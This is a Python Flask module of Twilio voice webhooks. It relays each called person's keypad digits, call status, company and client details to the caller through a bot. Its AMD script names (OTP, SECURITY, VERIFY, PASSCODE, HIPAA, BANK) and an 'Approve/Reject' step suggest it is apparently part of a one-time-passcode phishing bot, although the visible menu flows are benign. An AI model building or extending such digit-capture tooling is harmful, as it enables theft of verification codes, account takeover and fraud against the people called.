"""
Voice-side webhook routes: play, gather, menu, status.
Handles ringing, answered, voicemail (AMD), and terminal notifications.
"""

from flask import Blueprint, Response, request
from twilio.twiml.voice_response import VoiceResponse

import dbase as db
from modules import call_state as cs
from modules.notify import notify_caller, format_digits, mark_event_once
from modules.twiml_engine import resolve_twiml
from modules.bot_core import bot, safe_answer, send  # noqa: F401

voice_bp = Blueprint("voice", __name__)


def _xml(body):
    """Return a TwiML response with the correct content type."""
    return Response(str(body), mimetype="application/xml")


# ============================================================
# TwiML source
# ============================================================

@voice_bp.route("/webhooks/voice/play/<script_name>", methods=["GET", "POST"])
def play_script(script_name):
    call_sid = request.values.get("CallSid") or request.args.get("CallSid")
    return _xml(resolve_twiml(script_name, call_sid))


# ============================================================
# Gather / menu
# ============================================================

@voice_bp.route("/webhooks/voice/gather", methods=["POST"])
def voice_gather():
    digits = request.values.get("Digits", "")
    flow = request.values.get("flow", "")
    script = request.values.get("script", "")
    step = request.values.get("step", "")
    company = request.values.get("company", "")
    call_sid = request.values.get("CallSid", "")

    try:
        step_txt = f"Step {step}" if step else "Gather"
        script_txt = f" on *{script}*" if script else ""
        company_txt = f"\nCompany: *{company}*" if company else ""
        notify_caller(
            call_sid,
            f"🔢 *{step_txt}*{script_txt}\n"
            f"Customer pressed: {format_digits(digits)}"
            f"{company_txt}",
            parse_mode="Markdown",
        )
    except Exception as e:
        print(f"[gather notify] {e}", flush=True)

    resp = VoiceResponse()
    if flow == "appointment_confirm":
        if digits == "1":
            resp.say("Appointment confirmed. Thank you. Goodbye.")
        elif digits == "2":
            resp.say("We will reschedule. Goodbye.")
        elif digits == "3":
            resp.say("Appointment cancelled. Goodbye.")
        else:
            resp.say("No selection received. Goodbye.")
    else:
        resp.say("Thank you. Goodbye.")
    return _xml(resp)


@voice_bp.route("/webhooks/voice/menu", methods=["POST"])
def voice_menu():
    digits = request.values.get("Digits", "")
    flow = request.values.get("flow", "")
    script = request.values.get("script", "")
    step = request.values.get("step", "")
    company = request.values.get("company", "")
    call_sid = request.values.get("CallSid", "")

    try:
        step_txt = f"Step {step}" if step else "Menu"
        script_txt = f" on *{script}*" if script else ""
        company_txt = f"\nCompany: *{company}*" if company else ""
        notify_caller(
            call_sid,
            f"🔢 *{step_txt}*{script_txt}\n"
            f"Customer pressed: {format_digits(digits)}"
            f"{company_txt}",
            parse_mode="Markdown",
        )
    except Exception as e:
        print(f"[menu notify] {e}", flush=True)

    resp = VoiceResponse()
    if flow == "payment_reminder":
        resp.say("Please visit our website to pay. Goodbye." if digits == "1"
                 else "Business hours are Monday to Friday, 9 to 5. Goodbye.")
    elif flow == "delivery_notice":
        resp.say("A tracking link is on the way. Goodbye." if digits == "1"
                 else "We will attempt delivery another day. Goodbye.")
    elif flow == "survey":
        resp.say(f"Thank you for rating us {digits} out of 5. Goodbye."
                 if digits in ("1", "2", "3", "4", "5") else "No rating received. Goodbye.")
    elif flow == "callback_request":
        resp.say("A representative will call you back. Goodbye." if digits == "1"
                 else "Glad your issue is resolved. Goodbye.")
    elif flow == "hold_message":
        resp.say("Please leave a message after the tone. Goodbye." if digits == "1"
                 else "Business hours are Monday to Friday, 9 to 5. Goodbye.")
    else:
        resp.say("Thank you. Goodbye.")
    return _xml(resp)


# ============================================================
# Status callback
# ============================================================

AMD_SCRIPTS = {"OTP", "SECURITY", "VERIFY", "PASSCODE", "HIPAA", "BANK"}
SHORT_CALL_VOICEMAIL_SECONDS = 6


@voice_bp.route("/webhooks/voice/status", methods=["POST"])
def voice_status():
    sid = request.values.get("CallSid")
    status = request.values.get("CallStatus")
    recording = request.values.get("RecordingUrl")
    duration = request.values.get("CallDuration") or "0"
    answered_by = request.values.get("AnsweredBy") or ""

    if not sid:
        return "", 204

    db.update_campaign(sid, status=status, recording=recording)

    st = cs.get(sid)
    if st:
        if answered_by:
            cs.set_answered_by(sid, answered_by)
        if duration:
            cs.set_duration(sid, duration)
        st = cs.get(sid)

    script = (st.get("script") or "") if st else ""
    script_upper = script.upper()
    is_amd = script_upper in AMD_SCRIPTS

    try:
        company = db.get_call_company(sid)
    except Exception:
        company = None
    try:
        client_name, client_email = db.get_call_client(sid)
    except Exception:
        client_name, client_email = (None, None)

    ctx_lines = ""
    if company:
        ctx_lines += f"\nCompany: *{company}*"
    if client_name or client_email:
        ctx_lines += (
            f"\nClient: *{client_name or '-'}*"
            f"\nEmail: `{client_email or '-'}`"
        )

    dedupe_status = status
    if status == "answered" and answered_by:
        dedupe_status = f"answered:{answered_by}"

    first_time = mark_event_once(sid, dedupe_status)
    if not first_time:
        return "", 204

    if answered_by:
        if answered_by == "human":
            notify_caller(
                sid,
                f"🧑 *Human detected (AMD)*\n"
                f"Status: `{status}`\n"
                f"Script: *{script or '-'}*"
                f"{ctx_lines}\n"
                f"SID: `{sid}`",
                parse_mode="Markdown",
            )
            return "", 204

        if answered_by.startswith("machine"):
            notify_caller(
                sid,
                f"📭 *Voicemail detected ({answered_by})*\n"
                f"Script: *{script or '-'}*"
                f"{ctx_lines}\n"
                f"No Approve/Reject — machine cannot respond.\n"
                f"SID: `{sid}`",
                parse_mode="Markdown",
            )
            return "", 204

        if answered_by == "fax":
            notify_caller(
                sid,
                f"📠 *Fax detected*\n"
                f"Script: *{script or '-'}*"
                f"{ctx_lines}\n"
                f"SID: `{sid}`",
                parse_mode="Markdown",
            )
            return "", 204

    if status in ("answered", "in-progress"):
        notify_caller(
            sid,
            f"📞 *Customer answered the call*\n"
            f"Status: `{status}`\n"
            f"Script: *{script or '-'}*"
            f"{ctx_lines}\n"
            f"SID: `{sid}`",
            parse_mode="Markdown",
        )

    elif status == "ringing":
        notify_caller(
            sid,
            f"🔔 *Ringing…*\n"
            f"Script: *{script or '-'}*"
            f"{ctx_lines}\n"
            f"SID: `{sid}`",
            parse_mode="Markdown",
        )

    elif status in ("completed", "busy", "failed", "no-answer", "canceled"):
        try:
            dur_int = int(duration or 0)
        except Exception:
            dur_int = 0

        emoji = {
            "completed": "📴",
            "busy": "📵",
            "failed": "❌",
            "no-answer": "📭",
            "canceled": "🚫",
        }.get(status, "ℹ️")

        voicemail_note = ""
        if not is_amd:
            if status == "no-answer":
                voicemail_note = "\n📭 Likely voicemail (no answer)"
            elif status == "completed" and dur_int and dur_int <= SHORT_CALL_VOICEMAIL_SECONDS:
                voicemail_note = f"\n📭 Possible voicemail (short call {dur_int}s)"

        rec_line = f"\n🎙 Recording: {recording}" if recording else ""
        dur_line = f"\nDuration: `{dur_int}s`" if dur_int else ""

        notify_caller(
            sid,
            f"{emoji} *Call {status}*"
            f"{dur_line}"
            f"\nScript: *{script or '-'}*"
            f"{ctx_lines}"
            f"{voicemail_note}"
            f"{rec_line}\n"
            f"SID: `{sid}`",
            parse_mode="Markdown",
        )
        cs.clear(sid)

    return "", 204